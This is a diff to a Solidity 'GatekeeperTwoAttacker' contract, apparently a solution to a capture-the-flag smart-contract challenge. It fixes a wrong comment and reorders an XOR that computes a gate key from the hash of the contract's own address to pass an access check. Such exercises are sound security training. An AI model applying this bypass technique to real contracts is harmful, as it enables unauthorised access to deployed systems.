@@ -20,10 +20,10 @@ contract GatekeeperTwoAttacker {
         // A = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
         // B = uint64(_gateKey)
         // C = type(uint64).max
-        // A ^ B = C => B = C ^ C
+        // A ^ B = C => B = A ^ C
         bytes8 gateKey = bytes8(
-            uint64(type(uint64).max) ^
-                uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
+            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
+                uint64(type(uint64).max)
         );
 
         return gateKey;
